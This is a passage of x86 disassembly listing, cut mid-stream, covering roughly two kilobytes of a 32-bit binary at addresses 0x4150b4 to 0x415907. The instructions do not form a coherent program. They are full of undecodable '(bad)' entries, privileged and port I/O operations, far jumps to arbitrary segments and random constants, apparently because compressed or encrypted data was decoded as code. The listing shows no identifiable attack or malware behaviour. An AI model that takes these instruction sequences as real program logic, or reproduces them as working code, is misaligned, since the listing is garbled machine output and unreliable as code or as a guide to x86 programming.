  4150b4:	shl    DWORD PTR [edi],cl
  4150b6:	pop    esp
  4150b7:	(bad)  
  4150b8:	enter  0x8777,0xd1
  4150bc:	push   ebp
  4150bd:	shl    ecx,cl
  4150bf:	mov    dl,0xcd
  4150c1:	adc    esp,DWORD PTR [edi+0x7b14b7a7]
  4150c7:	dec    ebx
  4150c8:	pop    es
  4150c9:	test   eax,0xf06074ed
  4150ce:	in     eax,0x9e
  4150d0:	mov    ds:0x4911d5cb,al
  4150d5:	cdq    
  4150d6:	neg    DWORD PTR [esi]
  4150d8:	lahf   
  4150d9:	test   al,0x4c
  4150db:	adc    DWORD PTR [ecx+esi*2+0x77],0xf291bede
  4150e3:	jge    0x41514a
  4150e5:	and    BYTE PTR [ecx+ecx*4-0xb],al
  4150e9:	aad    0x35
  4150eb:	sub    al,0x83
  4150ed:	call   0xca73:0x5eb50723
  4150f4:	cmp    edi,ebp
  4150f6:	inc    eax
  4150f7:	mov    bl,0x3
  4150f9:	mov    ah,cl
  4150fb:	retf   0xafde
  4150fe:	icebp  
  4150ff:	push   eax
  415100:	and    DWORD PTR ss:[eax-0x78da1f88],ebx
  415107:	test   BYTE PTR [edi+eiz*8-0x29341e57],al
  41510e:	cmc    
  41510f:	int3   
  415110:	jo     0x41516f
  415112:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415113:	sub    al,BYTE PTR [ecx]
  415115:	fs scas eax,DWORD PTR es:[edi]
  415117:	mov    esi,DWORD PTR [edx-0x16]
  41511a:	in     al,dx
  41511b:	sub    esi,DWORD PTR [edx]
  41511d:	mov    ds:0x86e5d469,al
  415122:	xchg   ebx,eax
  415123:	aad    0x10
  415125:	adc    BYTE PTR [eax-0x486e076a],dh
  41512b:	dec    edi
  41512c:	popa   
  41512d:	sbb    ecx,edx
  41512f:	ja     0x415157
  415131:	in     al,0x94
  415133:	aad    0x0
  415135:	mov    dl,0x8b
  415137:	mov    dl,0x28
  415139:	inc    edx
  41513a:	mov    bl,0xb9
  41513c:	pop    edx
  41513d:	(bad)  
  41513e:	in     al,0xd9
  415140:	jno    0x415150
  415142:	repnz pop eax
  415144:	and    ebp,eax
  415146:	mov    esp,DWORD PTR [edx+ebp*4]
  415149:	retf   
  41514a:	retf   0x74ea
  41514d:	dec    esi
  41514e:	mov    dl,0x8
  415150:	and    BYTE PTR [edx+0x44],ch
  415153:	sbb    ebp,ecx
  415155:	(bad)  
  415156:	mov    edx,0xe5f67a5e
  41515b:	fldln2 
  41515d:	stos   BYTE PTR es:[edi],al
  41515e:	or     al,0x26
  415160:	add    ecx,edi
  415162:	leave  
  415163:	mov    eax,0xa60440a9
  415168:	shl    BYTE PTR [edx],1
  41516a:	xchg   dh,bh
  41516c:	iret   
  41516d:	inc    esi
  41516e:	das    
  41516f:	inc    eax
  415170:	aam    0xe0
  415172:	les    edx,FWORD PTR [esi]
  415174:	mov    dh,BYTE PTR [edi-0x260dafd5]
  41517a:	sbb    DWORD PTR [ebp+0x4e4050d7],0xf43d6623
  415184:	pusha  
  415185:	mov    ?,WORD PTR [ebp+0x77]
  415188:	add    BYTE PTR [esi-0x60ffd451],bl
  41518e:	rcl    DWORD PTR [edx+0x3b],cl
  415191:	sub    eax,0x135d8f4e
  415196:	xor    al,0xdd
  415198:	fwait
  415199:	and    al,0xf1
  41519b:	dec    ebp
  41519c:	adc    ebp,DWORD PTR [ebp+0x466bc67d]
  4151a2:	stos   DWORD PTR es:[edi],eax
  4151a3:	ret    
  4151a4:	(bad)  
  4151a5:	shl    BYTE PTR fs:[esi],0x76
  4151a9:	push   cs
  4151aa:	sbb    BYTE PTR [edi-0x67],cl
  4151ad:	jmp    0xe07f:0xf2e8eda1
  4151b4:	arpl   sp,di
  4151b6:	push   es
  4151b7:	test   al,0xde
  4151b9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4151ba:	pop    esi
  4151bb:	sbb    BYTE PTR [eax],al
  4151bd:	outs   dx,DWORD PTR ds:[esi]
  4151be:	rcr    DWORD PTR [ecx-0x29abb1d9],1
  4151c4:	jnp    0x41515c
  4151c6:	mov    al,ds:0xbd898b77
  4151cb:	sahf   
  4151cc:	cmp    al,0x2d
  4151ce:	xor    ecx,DWORD PTR [esi+0x7be449d2]
  4151d4:	repnz mov al,0x9a
  4151d7:	and    DWORD PTR [ecx-0x53],ecx
  4151da:	stos   DWORD PTR es:[edi],eax
  4151db:	repnz or DWORD PTR [ecx],ebp
  4151de:	mov    ds:0xd07d1c50,eax
  4151e3:	fadd   st(3),st
  4151e5:	mov    eax,0x570e7204
  4151ea:	mov    eax,ds:0x8c4f458
  4151ef:	data16 (bad) 
  4151f1:	(bad)  
  4151f2:	test   eax,0x7afbe0f3
  4151f7:	pop    ebp
  4151f8:	xchg   BYTE PTR ds:0xb0bd8a91,ah
  4151ff:	inc    ecx
  415200:	mov    cl,0x7a
  415202:	cmp    eax,0x45830f0a
  415207:	scas   eax,DWORD PTR es:[edi]
  415208:	jecxz  0x4151e8
  41520a:	arpl   WORD PTR [esi+0x6f],si
  41520d:	enter  0xe44b,0xc4
  415211:	dec    ecx
  415212:	and    BYTE PTR [esi+0x3becdb88],0xd9
  415219:	jmp    0x415265
  41521b:	and    bl,BYTE PTR ds:0x78ec651
  415221:	int3   
  415222:	repnz push ebx
  415224:	mov    ah,0xe4
  415226:	dec    ecx
  415227:	sub    ebp,DWORD PTR [edi-0xf]
  41522a:	jmp    0x4258446c
  41522f:	dec    esi
  415230:	loopne 0x4151c8
  415232:	mov    cl,0x8d
  415234:	add    al,0x3c
  415236:	fsubr  DWORD PTR [edx-0x7dd54e1c]
  41523c:	pushf  
  41523d:	mov    edi,DWORD PTR [bx+di+0x1fbd]
  415242:	push   ecx
  415243:	cwde   
  415244:	(bad)  
  415245:	dec    esi
  415246:	dec    esp
  415247:	fild   QWORD PTR [edi-0x2d]
  41524a:	ret    
  41524b:	in     al,0xfc
  41524d:	pop    ebp
  41524e:	daa    
  41524f:	pop    esi
  415250:	mov    eax,ds:0x5552539
  415255:	jmp    0x4151fe
  415257:	aam    0xfa
  415259:	sbb    eax,edi
  41525b:	leave  
  41525c:	js     0x41523a
  41525e:	lahf   
  41525f:	ss test al,0x1c
  415262:	test   dl,dl
  415264:	retf   
  415265:	jmp    0xc43:0x52363b0b
  41526c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41526d:	in     al,0x1c
  41526f:	fbld   TBYTE PTR [eax-0x3e]
  415272:	sti    
  415273:	cmc    
  415274:	jae    0x415242
  415276:	jge    0x415265
  415278:	inc    ecx
  415279:	aad    0x6c
  41527b:	pop    esi
  41527c:	dec    esp
  41527d:	sti    
  41527e:	cmp    eax,0x9a1b31e
  415283:	jo     0x415270
  415285:	arpl   WORD PTR [edi],cx
  415287:	or     dl,ch
  415289:	xor    DWORD PTR [esi],0x30478d70
  41528f:	test   BYTE PTR [ebx-0x7764b72b],ch
  415295:	test   eax,0xd715c53d
  41529a:	call   0x39e7893
  41529f:	cmp    al,0xbb
  4152a1:	push   cs
  4152a2:	push   ds
  4152a3:	jmp    0xef0dc099
  4152a8:	jecxz  0x415241
  4152aa:	lods   eax,DWORD PTR ds:[esi]
  4152ab:	leave  
  4152ac:	push   edi
  4152ad:	mul    BYTE PTR [ebx-0x7d]
  4152b0:	jg     0x4152c0
  4152b2:	and    BYTE PTR [edi],al
  4152b4:	mov    cl,0x45
  4152b6:	pop    edi
  4152b7:	(bad)  
  4152b8:	or     eax,0xdca4a5c8
  4152bd:	jo     0x415268
  4152bf:	xchg   edx,eax
  4152c0:	push   ss
  4152c1:	push   cs
  4152c2:	es inc ebp
  4152c4:	jae    0x4152bf
  4152c6:	clc    
  4152c7:	fadd   st,st(2)
  4152c9:	jmp    0x6fa2:0xfefce9d0
  4152d0:	shl    ah,0x96
  4152d3:	inc    esi
  4152d4:	into   
  4152d5:	data16 aam 0x87
  4152d8:	loopne 0x4152ef
  4152da:	mov    dl,0xe2
  4152dc:	and    bh,BYTE PTR [ebx]
  4152de:	retf   0x2c7a
  4152e1:	loop   0x4152d2
  4152e3:	sar    bl,cl
  4152e5:	mov    edi,0xb704ed6
  4152ea:	mov    eax,ds:0xe2764637
  4152ef:	enter  0xd66a,0xf3
  4152f3:	mov    ebp,0xe0f73fdf
  4152f8:	or     BYTE PTR [edi],dh
  4152fa:	cmp    DWORD PTR [ebp-0x2d],ebx
  4152fd:	adc    edx,esp
  4152ff:	mov    eax,ds:0x2b8eda35
  415304:	mov    al,0x16
  415306:	test   eax,0x1406287e
  41530b:	jns    0x41535e
  41530d:	mov    BYTE PTR [ebp+0x5248691e],cl
  415313:	ja     0x415385
  415315:	sub    BYTE PTR [ebx-0x5d94e372],dh
  41531b:	imul   esi,DWORD PTR [eax+0x7d],0x41
  41531f:	or     esp,esi
  415321:	jno    0x415383
  415323:	mov    ds:0x8c257891,eax
  415328:	sub    esi,DWORD PTR [edi-0x28975398]
  41532e:	out    0xd6,al
  415330:	xor    eax,0x219f9347
  415335:	aaa    
  415336:	pop    edx
  415337:	rol    esp,cl
  415339:	hlt    
  41533a:	xor    DWORD PTR [esi-0x17],ebx
  41533d:	int    0xd9
  41533f:	dec    ebp
  415340:	clc    
  415341:	(bad)  
  415343:	addr16 push esp
  415345:	adc    BYTE PTR cs:[esp+eax*4],ah
  415349:	les    esi,FWORD PTR [esp+ecx*8-0x623e7b5f]
  415350:	jmp    0x4153cb
  415352:	jp     0x4153bf
  415354:	pop    ecx
  415355:	cmp    eax,0x3257637d
  41535a:	fdiv   QWORD PTR [ebx-0x8]
  41535d:	add    bl,BYTE PTR cs:[edx-0x5d]
  415361:	push   eax
  415362:	mov    cl,0xbd
  415364:	xchg   ebx,eax
  415365:	call   0x473cf9f7
  41536a:	push   ds
  41536b:	in     al,dx
  41536c:	push   es
  41536d:	not    BYTE PTR [esp+eax*1-0x2a]
  415371:	adc    ah,BYTE PTR [edi+0x172e070c]
  415377:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415378:	addr16 dec edi
  41537a:	mov    esi,0xc125a680
  41537f:	mov    dl,0xab
  415381:	fwait
  415382:	fs xchg ecx,eax
  415384:	cmp    DWORD PTR [ebx],0xffffffe3
  415387:	xlat   BYTE PTR ds:[ebx]
  415388:	dec    BYTE PTR [eax-0x6dce135a]
  41538e:	add    BYTE PTR [edi-0x6fe4b8cd],ah
  415394:	xchg   ebp,eax
  415395:	pinsrw mm6,WORD PTR [ebp*2-0x235ff80e],0xd8
  41539e:	jno    0x415325
  4153a0:	lds    ebx,FWORD PTR [ecx]
  4153a2:	mov    eax,ds:0x6ce906ed
  4153a7:	in     al,dx
  4153a8:	outs   dx,DWORD PTR ds:[esi]
  4153a9:	sti    
  4153aa:	adc    BYTE PTR [esp+eax*2-0x3b9425d4],al
  4153b1:	adc    ch,ah
  4153b3:	mov    BYTE PTR [eax-0x14],bh
  4153b6:	loop   0x415406
  4153b8:	test   DWORD PTR [edx+0x2e],0x8c5a4c12
  4153bf:	pop    eax
  4153c0:	loope  0x415396
  4153c2:	mov    dl,dh
  4153c4:	(bad)  
  4153c5:	xchg   edi,eax
  4153c6:	bound  edi,QWORD PTR [ebx-0x7d]
  4153c9:	mov    bh,0x98
  4153cb:	push   edi
  4153cc:	shr    DWORD PTR [ecx+0x2],1
  4153cf:	mov    ecx,0x672202b
  4153d4:	dec    ebp
  4153d5:	sbb    BYTE PTR [ebp-0x6a81619a],dh
  4153db:	sbb    dh,ch
  4153dd:	mov    WORD PTR [ecx-0x30],fs
  4153e0:	jno    0x415425
  4153e2:	aad    0x41
  4153e4:	xchg   esp,eax
  4153e5:	sbb    al,0x35
  4153e7:	repz imul ebx,DWORD PTR [ebx],0xee9f4b39
  4153ee:	enter  0x47e6,0xd5
  4153f2:	mov    bl,0xa5
  4153f4:	sbb    BYTE PTR [edi+0x65f75237],al
  4153fa:	cwde   
  4153fb:	call   0xdd9546c6
  415400:	mov    ds:0x40e62237,al
  415405:	stos   DWORD PTR es:[edi],eax
  415406:	aad    0x87
  415408:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415409:	cdq    
  41540a:	mov    esp,0x1e6e7f08
  41540f:	fisttp QWORD PTR [edi-0x28]
  415412:	hlt    
  415413:	cmp    DWORD PTR [ecx+ebp*2],edx
  415416:	rcr    DWORD PTR [ecx+0x61],1
  415419:	mov    ?,WORD PTR [eax+0x423fde3e]
  41541f:	(bad)  
  415420:	mov    eax,ds:0xf1759009
  415425:	arpl   WORD PTR [edx],si
  415427:	adc    BYTE PTR [edi+0x711dff5d],bl
  41542d:	sbb    BYTE PTR [esi],dh
  41542f:	(bad)  
  415430:	adc    eax,0xffde43f3
  415435:	cmc    
  415436:	in     al,dx
  415437:	xchg   ebx,eax
  415438:	sub    edi,DWORD PTR [edi-0x11]
  41543b:	lds    eax,FWORD PTR [edi+0x6acd81de]
  415441:	push   ebp
  415442:	mov    eax,DWORD PTR [ebx+0x2d190395]
  415448:	pop    ss
  415449:	fist   WORD PTR [edx]
  41544b:	loopne 0x415424
  41544d:	popf   
  41544e:	cmc    
  41544f:	push   esi
  415450:	ret    
  415451:	xor    BYTE PTR [esi+0x1d],bh
  415454:	adc    eax,0x4f57cd35
  415459:	repz add BYTE PTR [ecx],cl
  41545c:	inc    ecx
  41545d:	mov    cl,BYTE PTR [edi]
  41545f:	daa    
  415460:	cwde   
  415461:	xchg   esp,eax
  415462:	xor    DWORD PTR [esi+esi*1+0x5a],0xffffff8b
  415467:	pop    edx
  415468:	jge    0x41547d
  41546a:	sbb    ch,BYTE PTR [ebx+0x1]
  41546d:	jmp    0x415464
  41546f:	push   eax
  415470:	jle    0x4154da
  415472:	inc    edi
  415473:	fsubr  QWORD PTR [ebp+0x7476d9cd]
  415479:	lahf   
  41547a:	pop    esi
  41547b:	inc    edx
  41547c:	cmp    ebx,DWORD PTR [ebx]
  41547e:	jne    0x41547d
  415480:	inc    ecx
  415481:	adc    eax,0xa3ddfbad
  415486:	out    0x33,eax
  415488:	jo     0x415464
  41548a:	(bad)  
  41548b:	(bad)  
  41548c:	fld    QWORD PTR [edx+0x50]
  41548f:	aaa    
  415490:	icebp  
  415491:	mov    eax,0x92c9e03c
  415496:	ret    
  415497:	sub    BYTE PTR [eax],al
	...
  415511:	add    BYTE PTR [eax],al
  415513:	add    BYTE PTR [edi-0x5c],ch
  415516:	daa    
  415517:	jbe    0x415508
  415519:	idiv   DWORD PTR [edi-0x43]
  41551c:	mov    ecx,0xc616f8af
  415521:	out    dx,al
  415522:	cmc    
  415523:	inc    ecx
  415524:	popf   
  415525:	cli    
  415526:	add    BYTE PTR [eax],al
  415528:	ins    BYTE PTR es:[edi],dx
  415529:	pop    es
  41552a:	add    BYTE PTR [eax],al
  41552c:	push   edx
  41552d:	pushf  
  41552e:	sub    BYTE PTR [ebx],0xaf
  415531:	out    dx,al
  415532:	not    BYTE PTR [ebx+eiz*4]
  415535:	mov    dl,0xd5
  415537:	adc    BYTE PTR [edi-0x63f770c2],dh
  41553d:	ss xchg edx,eax
  41553f:	mov    ds:0xb7af39ce,al
  415544:	dec    ecx
  415545:	or     edx,DWORD PTR [ecx+eiz*4-0x4c165db5]
  41554c:	inc    edx
  41554d:	int3   
  41554e:	push   edi
  41554f:	mov    edx,0xe1496f71
  415554:	xor    BYTE PTR [ecx+0x3fc11f25],al
  41555a:	fldl2e 
  41555c:	icebp  
  41555d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41555e:	mov    edi,esp
  415560:	loope  0x41553b
  415562:	mov    eax,ds:0xde90d69d
  415567:	dec    dx
  415569:	pop    eax
  41556a:	dec    ebx
  41556b:	(bad)  
  41556c:	pusha  
  41556d:	fs sub al,0x2f
  415570:	sub    DWORD PTR [esi-0x19],edi
  415573:	ins    DWORD PTR es:[edi],dx
  415574:	inc    edi
  415575:	mov    edi,0x3db1d4a2
  41557a:	xor    ebx,edx
  41557c:	cmp    cl,BYTE PTR ds:0xaafdc72f
  415582:	cmc    
  415583:	xchg   esi,eax
  415584:	imul   ecx,DWORD PTR [ebx-0x1a],0xbe231463
  41558b:	or     DWORD PTR [esi+0x1c5bd407],0x42
  415592:	je     0x4155d1
  415594:	cmp    edx,edx
  415596:	xchg   DWORD PTR [edx+0x24],edi
  415599:	pop    ebx
  41559a:	push   0x3a
  41559c:	int3   
  41559d:	fcomp  QWORD PTR [esi-0x7bd1f650]
  4155a3:	xor    ebp,DWORD PTR [esp+ebx*1-0x77]
  4155a7:	cmp    cl,BYTE PTR ds:0x7030d82e
  4155ad:	retf   
  4155ae:	js     0x41558a
  4155b0:	lahf   
  4155b1:	xchg   BYTE PTR [ecx-0x58],bl
  4155b4:	mov    ebp,0x3937a8bc
  4155b9:	and    al,0x2e
  4155bb:	add    eax,0x422b811e
  4155c0:	rol    DWORD PTR [eax-0x2b],0xb4
  4155c4:	(bad)  
  4155c6:	adc    al,0x7a
  4155c8:	arpl   WORD PTR [eax],cx
  4155ca:	or     eax,0x9d68918e
  4155cf:	adc    al,BYTE PTR [edi-0x10]
  4155d2:	ds es scas eax,DWORD PTR es:[edi]
  4155d5:	add    DWORD PTR [esi-0x61],0xffffffde
  4155d9:	in     al,dx
  4155da:	or     eax,0x1df54f7e
  4155df:	sub    BYTE PTR [edx],ah
  4155e1:	popf   
  4155e2:	mov    ds:0xc46b9467,al
  4155e7:	cmp    esp,DWORD PTR [edx]
  4155e9:	add    esi,DWORD PTR [esi-0xb]
  4155ec:	imul   ebx,DWORD PTR [eax],0xffffffe9
  4155ef:	fcmovb st,st(1)
  4155f1:	pop    edx
  4155f2:	add    dh,BYTE PTR [esi]
  4155f4:	loope  0x4155e7
  4155f6:	adc    cl,al
  4155f8:	push   ss
  4155f9:	ret    
  4155fa:	xchg   ecx,esp
  4155fc:	repnz mov ecx,DWORD PTR [ebp+0x148eb53f]
  415603:	push   0x47a477f8
  415608:	int3   
  415609:	scas   al,BYTE PTR es:[edi]
  41560a:	pop    ds
  41560b:	aaa    
  41560c:	out    dx,eax
  41560d:	repz xchg dl,ah
  415610:	ins    BYTE PTR es:[edi],dx
  415611:	jb     0x41563b
  415613:	addr16 out dx,eax
  415615:	loop   0x4155f5
  415617:	push   ecx
  415618:	or     esp,DWORD PTR [eax-0x69df35ec]
  41561e:	fwait
  41561f:	ret    
  415620:	xor    al,BYTE PTR [eax-0x74]
  415623:	in     eax,dx
  415624:	lods   eax,DWORD PTR ds:[esi]
  415625:	cmp    ebp,eax
  415627:	ins    BYTE PTR es:[edi],dx
  415628:	add    eax,0x7f5bf553
  41562d:	(bad)  
  41562e:	jg     0x4155bb
  415630:	js     0x41566f
  415632:	jl     0x4155f3
  415634:	xchg   ebx,eax
  415635:	loop   0x41567b
  415637:	and    eax,0xbf97e24e
  41563c:	fcomp  st(5)
  41563e:	scas   al,BYTE PTR es:[edi]
  41563f:	test   eax,0x77b27535
  415644:	mov    eax,ds:0xc2ca3f9a
  415649:	scas   al,BYTE PTR es:[edi]
  41564a:	cdq    
  41564b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41564c:	cmp    esp,DWORD PTR [ecx+eax*1+0x78]
  415650:	idiv   BYTE PTR [esi]
  415652:	jmp    0x7c6d:0x609887de
  415659:	or     al,0x54
  41565b:	mov    ah,0xfa
  41565d:	pop    esp
  41565e:	mov    edx,0x978c9811
  415663:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415664:	or     BYTE PTR [edx+0x4],dh
  415667:	push   ebx
  415668:	xor    DWORD PTR [esi-0x56],ebx
  41566b:	ds pop edi
  41566d:	adc    eax,0x79f0a7ca
  415672:	and    al,dl
  415674:	lock retf 
  415676:	in     al,dx
  415677:	mov    ecx,0x1524cb34
  41567c:	pop    edi
  41567d:	xchg   edx,eax
  41567e:	(bad)  
  41567f:	xchg   edi,eax
  415680:	xor    edx,ebx
  415682:	lahf   
  415683:	dec    ebx
  415684:	scas   al,BYTE PTR es:[edi]
  415685:	xchg   BYTE PTR [ebp-0x34],dl
  415688:	lods   eax,DWORD PTR ds:[esi]
  415689:	std    
  41568a:	cmp    ch,BYTE PTR [eax-0x1d]
  41568d:	bound  ebx,QWORD PTR [esi]
  41568f:	sbb    eax,0xa33dbf3d
  415694:	push   esp
  415695:	mov    ds:0x6ab93f95,al
  41569a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41569b:	jbe    0x415677
  41569d:	jge    0x4156ad
  41569f:	in     eax,dx
  4156a0:	mov    esp,0xf1242bb4
  4156a5:	lahf   
  4156a6:	in     eax,dx
  4156a7:	clc    
  4156a8:	xchg   ecx,eax
  4156a9:	clc    
  4156aa:	stos   BYTE PTR es:[edi],al
  4156ab:	or     eax,0x9d23eac7
  4156b0:	(bad)  
  4156b1:	dec    ebp
  4156b2:	or     al,0xac
  4156b4:	sbb    ebx,ecx
  4156b6:	and    DWORD PTR [eax+0x69a70037],0xf0fda25e
  4156c0:	and    DWORD PTR [edi+0x191c6558],esi
  4156c6:	(bad)  [eax-0x2]
  4156c9:	add    DWORD PTR [edx+eax*2],esi
  4156cc:	cdq    
  4156cd:	jle    0x415667
  4156cf:	adc    al,0xe2
  4156d1:	jns    0x4156a2
  4156d3:	fwait
  4156d4:	je     0x4156fa
  4156d6:	and    DWORD PTR [edx-0x13eb375],esp
  4156dc:	mov    ds:0x41df4f79,al
  4156e1:	mov    cl,BYTE PTR ds:0x797a40d5
  4156e7:	cli    
  4156e8:	xchg   edi,eax
  4156e9:	fdivr  QWORD PTR [esi+ecx*8]
  4156ec:	inc    ebx
  4156ed:	inc    eax
  4156ee:	sahf   
  4156ef:	data16 jae 0x415732
  4156f2:	neg    DWORD PTR [ecx-0x37a5caa0]
  4156f8:	jno    0x415775
  4156fa:	mov    ebx,0x73866b3b
  4156ff:	ja     0x41576d
  415701:	das    
  415702:	pushf  
  415703:	stc    
  415704:	rcr    BYTE PTR ds:[ebx+edx*4-0x14eb234f],cl
  41570c:	lods   al,BYTE PTR ds:[esi]
  41570d:	jo     0x415743
  41570f:	sar    BYTE PTR [esi+0x5b1845af],1
  415715:	ficomp WORD PTR [esi-0x54]
  415718:	fidivr WORD PTR [esi+0x5699a9c9]
  41571e:	retf   0xc7b2
  415721:	out    dx,eax
  415722:	ror    ch,0xcf
  415725:	dec    edx
  415726:	push   ds
  415727:	sar    DWORD PTR [edi-0x61],0x44
  41572b:	cmp    eax,0x17abd042
  415730:	hlt    
  415731:	adc    BYTE PTR [ebp+0x6d0510f8],bh
  415737:	adc    al,0xa7
  415739:	xchg   ebx,eax
  41573a:	jl     0x41575b
  41573c:	(bad)  
  41573d:	ja     0x415761
  41573f:	xchg   ebp,eax
  415740:	add    bl,cl
  415742:	out    0x79,al
  415744:	test   DWORD PTR [ebx],edx
  415746:	cmp    al,0x4f
  415748:	and    esp,DWORD PTR [edx]
  41574a:	xor    eax,DWORD PTR [edi]
  41574c:	and    BYTE PTR [edx],bh
  41574e:	adc    bh,BYTE PTR [edi-0x7f5db564]
  415754:	je     0x4157a9
  415756:	ins    BYTE PTR es:[edi],dx
  415757:	and    cl,BYTE PTR [eax]
  415759:	jmp    0x61e48be4
  41575e:	mov    DWORD PTR [edx+0x5a6f8597],ebp
  415764:	in     eax,dx
  415765:	inc    ebx
  415766:	ror    DWORD PTR [edi],1
  415768:	mov    DWORD PTR [edi-0xe],ebp
  41576b:	in     eax,0x26
  41576d:	mov    ds:0x1083066a,al
  415772:	xchg   edx,eax
  415773:	int    0xf1
  415775:	sub    ah,BYTE PTR [eax-0x3c539d65]
  41577b:	scas   eax,DWORD PTR es:[edi]
  41577c:	mov    dh,0xa6
  41577e:	adc    al,0x8f
  415780:	lods   eax,DWORD PTR ds:[esi]
  415781:	enter  0xca83,0x46
  415785:	ins    DWORD PTR es:[edi],dx
  415786:	dec    ecx
  415787:	adc    ah,BYTE PTR [ebx+0x4de89619]
  41578d:	outs   dx,DWORD PTR ds:[esi]
  41578e:	outs   dx,DWORD PTR ds:[esi]
  41578f:	mov    eax,0x433c7a42
  415794:	sub    esi,ebx
  415796:	imul   ebx,edi,0xd4d147fa
  41579c:	cs pop esi
  41579e:	pop    ebx
  41579f:	push   ds
  4157a0:	call   FWORD PTR [esp+eiz*8]
  4157a3:	sbb    al,0x31
  4157a5:	js     0x415736
  4157a7:	mov    ds:0x6d60c979,eax
  4157ac:	sub    DWORD PTR [edx+ebx*8],ecx
  4157af:	push   cs
  4157b0:	shl    eax,0xbd
  4157b3:	inc    edi
  4157b4:	adc    al,0x1c
  4157b6:	fsub   DWORD PTR [edx+0x7579d1e7]
  4157bc:	push   cs
  4157bd:	sbb    ecx,esi
  4157bf:	dec    ebx
  4157c0:	push   ebp
  4157c1:	inc    edx
  4157c2:	ror    DWORD PTR [esi+eax*2],1
  4157c5:	and    al,0x26
  4157c7:	inc    esp
  4157c8:	add    ch,BYTE PTR [edi+0x2fc0ed54]
  4157ce:	or     ebp,ebx
  4157d0:	sbb    ebp,edx
  4157d2:	sbb    edi,edx
  4157d4:	and    DWORD PTR [edi-0x55],eax
  4157d7:	sahf   
  4157d8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4157d9:	mov    bh,0xed
  4157db:	out    0xe,al
  4157dd:	or     eax,0x5ef88afd
  4157e2:	xchg   edi,eax
  4157e3:	and    al,0x7b
  4157e5:	cdq    
  4157e6:	add    esi,esi
  4157e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4157e9:	xchg   ecx,eax
  4157ea:	adc    eax,0x8f91533
  4157ef:	pop    edi
  4157f0:	(bad)  
  4157f1:	inc    DWORD PTR [eax]
  4157f3:	or     eax,0xafc9e1bc
  4157f8:	xchg   esp,eax
  4157f9:	adc    esi,ebx
  4157fb:	repz mov al,0xf6
  4157fe:	fwait
  4157ff:	mov    dl,0x59
  415801:	push   edx
  415802:	cwde   
  415803:	hlt    
  415804:	push   edx
  415805:	sbb    BYTE PTR [ebx-0x1e9b9d76],cl
  41580b:	xchg   edx,eax
  41580c:	mov    bl,BYTE PTR [esi+0x2e]
  41580f:	mov    esp,0x7ef10e96
  415814:	cmp    al,0x86
  415816:	pop    eax
  415817:	mov    ah,0xda
  415819:	pop    ecx
  41581a:	pushf  
  41581b:	push   edi
  41581c:	and    DWORD PTR [ebp-0x2c7ea59c],0xffffffd4
  415823:	cmp    edi,0xffffffff
  415826:	pop    ds
  415827:	call   0xb514:0x869e2740
  41582e:	add    dl,BYTE PTR [ecx+0x68d2fc8c]
  415834:	jne    0x415868
  415836:	push   ecx
  415837:	pop    ss
  415838:	sbb    ch,BYTE PTR [ebx+0x6e7daed]
  41583e:	adc    eax,0xe412d37a
  415843:	lods   al,BYTE PTR ds:[esi]
  415844:	xchg   edx,eax
  415845:	push   edi
  415846:	arpl   WORD PTR [ebx+0x189cd858],di
  41584c:	mov    al,0xa9
  41584e:	mov    bh,0xa8
  415850:	ss add al,0x8a
  415853:	clc    
  415854:	mov    ebp,0xbf028318
  415859:	cmp    ebp,esp
  41585b:	adc    DWORD PTR [edx+esi*1],ebx
  41585e:	push   0xffffffa7
  415860:	cmp    al,0x90
  415862:	stc    
  415863:	(bad)  
  415864:	cld    
  415865:	add    dh,BYTE PTR [edi-0x634ad830]
  41586b:	jge    0x415806
  41586d:	adc    eax,0x1252c151
  415872:	jno    0x415866
  415874:	mov    ebp,DWORD PTR [ecx]
  415876:	jne    0x41581f
  415878:	call   0x92c2:0x881048a7
  41587f:	into   
  415880:	jl     0x415872
  415882:	into   
  415883:	test   al,0x2
  415885:	out    0xd9,al
  415887:	xchg   esp,eax
  415888:	mov    al,0xee
  41588a:	mov    edx,0xddc3199b
  41588f:	jbe    0x4158e1
  415891:	jae    0x415861
  415893:	mov    dl,0xa6
  415895:	sti    
  415896:	out    0x8a,eax
  415898:	dec    ebx
  415899:	test   BYTE PTR [esi-0x40350805],cl
  41589f:	inc    eax
  4158a0:	js     0x41586e
  4158a2:	es jno 0x4158e3
  4158a5:	mov    cs,WORD PTR [ebx+eiz*1-0x2fe8bd8a]
  4158ac:	es push es
  4158ae:	cmp    ah,BYTE PTR [ecx]
  4158b0:	inc    ecx
  4158b1:	push   cs
  4158b2:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4158b4:	cmp    al,0xc7
  4158b6:	jbe    0x4158ef
  4158b8:	in     eax,dx
  4158b9:	cmp    BYTE PTR [ebx-0x57c51b6c],ch
  4158bf:	mov    bh,0xb7
  4158c1:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  4158c3:	ins    BYTE PTR es:[edi],dx
  4158c4:	or     bl,BYTE PTR [eax-0x133a3b6a]
  4158ca:	ficom  WORD PTR [ebp+0x54]
  4158cd:	xchg   ecx,eax
  4158ce:	push   es
  4158cf:	xor    eax,ebx
  4158d1:	jge    0x41585f
  4158d3:	xor    bh,al
  4158d5:	mov    bh,0xb1
  4158d7:	(bad)  
  4158d8:	arpl   si,di
  4158da:	jns    0x41594b
  4158dc:	add    ebp,0xffffffbc
  4158df:	int    0x2b
  4158e1:	lahf   
  4158e2:	jnp    0x41594d
  4158e4:	cmp    edx,DWORD PTR [ebp+0x2cea6597]
  4158ea:	outs   dx,BYTE PTR ds:[esi]
  4158eb:	repz mov dl,0x84
  4158ee:	jecxz  0x4158ec
  4158f0:	mov    dl,0x76
  4158f2:	xor    DWORD PTR [esi+esi*1-0x4039c691],0x1f
  4158fa:	fisttp WORD PTR [esi+0x37bd4939]
  415900:	inc    esp
  415901:	in     eax,dx
  415902:	pop    esp
  415903:	xchg   dh,ah
  415905:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415906:	xchg   ecx,eax
  415907:	push   ss
